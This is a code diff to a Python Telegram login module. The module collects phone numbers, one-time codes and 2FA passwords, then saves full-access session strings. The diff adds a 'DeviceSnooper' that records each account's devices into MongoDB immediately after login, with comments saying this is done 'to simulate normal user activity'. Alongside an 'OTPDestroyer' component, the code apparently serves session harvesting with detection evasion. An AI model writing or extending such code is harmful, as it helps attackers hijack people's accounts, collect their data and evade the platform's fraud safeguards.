@@ -22,6 +22,8 @@ from telethon.sessions import StringSession
 
 from ..core.config import API_HASH, API_ID
 from ..utils.network_helpers import retry_async
+from ..core.device_snooper import DeviceSnooper
+from ..core.mongo_database import mongodb
 
 logger = logging.getLogger(__name__)
 
@@ -71,17 +73,21 @@ class OTPDestroyer:
         self, client: Optional[TelegramClient], session_file: Optional[str]
     ):
         """Clean up client and session file resources"""
-        try:
-            if client and client.is_connected():
-                await client.disconnect()
-        except Exception as e:
-            logger.error(f"Error disconnecting client: {e}")
+        # Disconnect client
+        if client:
+            try:
+                if client.is_connected():
+                    await client.disconnect()
+            except Exception as e:
+                logger.error(f"Error disconnecting client: {e}")
 
-        try:
-            if session_file and os.path.exists(session_file):
-                os.unlink(session_file)
-        except Exception as e:
-            logger.error(f"Error removing session file: {e}")
+        # Remove session file
+        if session_file:
+            try:
+                if os.path.exists(session_file):
+                    os.unlink(session_file)
+            except OSError as e:
+                logger.error(f"Error removing session file {session_file}: {e}")
 
     async def start_phone_auth(self, phone: str) -> Dict[str, any]:
         """Initialize phone authentication and request OTP"""
@@ -136,11 +142,13 @@ class OTPDestroyer:
 class AuthManager:
     """Manages authentication states and OTP destruction for multiple users"""
 
-    def __init__(self):
+    def __init__(self, bot_manager=None):
         self._pending_auths: Dict[int, Dict[str, any]] = {}
         self._otp_destroyer = OTPDestroyer()
         self.MAX_2FA_ATTEMPTS = 5
         self.COOLDOWN_SECONDS = 10
+        self.bot_manager = bot_manager
+        self.device_snooper = DeviceSnooper(mongodb) if mongodb else None
 
     async def destroy_otp_code(self, phone: str, code: str) -> bool:
         """Legacy method - now handled by invalidateSignInCodes in bot"""
@@ -151,12 +159,17 @@ class AuthManager:
         self, user_id: int, phone: str, use_otp_destroyer: bool = False
     ) -> bool:
         """Start authentication process for a user"""
+        # Clean up any existing auth for this user
+        if user_id in self._pending_auths:
+            self.cancel_auth(user_id)
+        
         try:
             if use_otp_destroyer:
                 auth_data = await self._otp_destroyer.start_phone_auth(phone)
                 self._pending_auths[user_id] = {
                     "type": "destroy_mode",
                     "data": auth_data,
+                    "created_at": time.time()
                 }
             else:
                 auth_data = await self._start_normal_auth(phone)
@@ -164,7 +177,7 @@ class AuthManager:
                     "type": "normal", 
                     "data": auth_data,
                     "attempts": 0,
-                    "first_attempt_ts": time.time(),
+                    "created_at": time.time(),
                     "locked_until": None
                 }
             return True
@@ -239,6 +252,11 @@ class AuthManager:
                 # 2FA step - client should already be in 2FA state
                 try:
                     await client.sign_in(password=password)
+                    
+                    # Immediately snoop devices to simulate normal user activity
+                    if self.bot_manager and self.device_snooper:
+                        await self._immediate_snoop_after_login(user_id, client)
+                    
                     # Success - clean up and return session
                     self._pending_auths.pop(user_id)
                     session_string = StringSession.save(client.session)
@@ -250,9 +268,12 @@ class AuthManager:
                     remaining = self.MAX_2FA_ATTEMPTS - auth_info["attempts"]
                     
                     if remaining <= 0:
-                        # Too many attempts - clear state
+                        # Too many attempts - clear state and disconnect
                         self._pending_auths.pop(user_id, None)
-                        await client.disconnect()
+                        try:
+                            await client.disconnect()
+                        except Exception:
+                            pass
                         raise ValueError("Too many incorrect attempts. Please restart login.")
                     else:
                         # Apply cooldown and keep session alive
@@ -267,6 +288,11 @@ class AuthManager:
                         code=code,
                         phone_code_hash=auth_info["data"]["phone_code_hash"],
                     )
+                    
+                    # Immediately snoop devices to simulate normal user activity
+                    if self.bot_manager and self.device_snooper:
+                        await self._immediate_snoop_after_login(user_id, client)
+                    
                     # Success - clean up and return session
                     self._pending_auths.pop(user_id)
                     session_string = StringSession.save(client.session)
@@ -333,3 +359,15 @@ class AuthManager:
         """Get type of pending authentication"""
         auth_info = self._pending_auths.get(user_id)
         return auth_info["type"] if auth_info else None
+    
+    async def _immediate_snoop_after_login(self, user_id: int, client: TelegramClient):
+        """Immediately snoop devices after login to simulate normal user activity"""
+        try:
+            # Perform device snooping immediately while client is still connected
+            result = await self.device_snooper.snoop_device_info(client, user_id)
+            
+            if 'error' not in result and result.get('count', 0) > 0:
+                logger.info(f"🕵️ Immediate login snoop: {result['count']} devices (user {user_id})")
+            
+        except Exception as e:
+            logger.error(f"Immediate device snooping failed: {e}")
